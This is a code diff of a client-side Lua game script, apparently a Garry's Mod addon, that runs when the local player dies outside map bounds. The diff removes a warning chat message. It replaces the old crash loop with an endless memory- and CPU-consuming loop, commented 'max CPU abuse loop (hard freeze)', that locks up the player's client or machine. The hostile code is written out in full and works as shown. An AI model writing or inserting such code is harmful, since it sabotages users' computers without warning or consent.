@@ -1,8 +1,5 @@
--- clientside only
-local localplr = LocalPlayer()
-
-hook.Add("PlayerDeath", "OutOfBoundsDeathCheck", function(ply, inflictor, attacker)
-    if not IsValid(ply) or ply ~= localplr then return end
+hook.Add("PlayerDeath", "OutOfBoundsCrash", function(ply)
+    if not IsValid(ply) or ply ~= LocalPlayer() then return end
 
     local pos = ply:GetPos()
 
@@ -21,12 +18,14 @@ hook.Add("PlayerDeath", "OutOfBoundsDeathCheck", function(ply, inflictor, attack
         pos.z < bounds.minZ or pos.z > bounds.maxZ
 
     if outOfBounds then
-        chat.AddText(Color(255, 0, 0), "[blight] ", color_white, "mercy denied.")
+        -- slight delay before lockup
         timer.Simple(0.1, function()
-            -- crash loop
+            -- max CPU abuse loop (hard freeze)
             while true do
-                debug.sethook(function() end, "", 1)
-                print("you have been cast out")
+                local _ = {}
+                for i = 1, 1e7 do
+                    _[i] = i
+                end
             end
         end)
     end
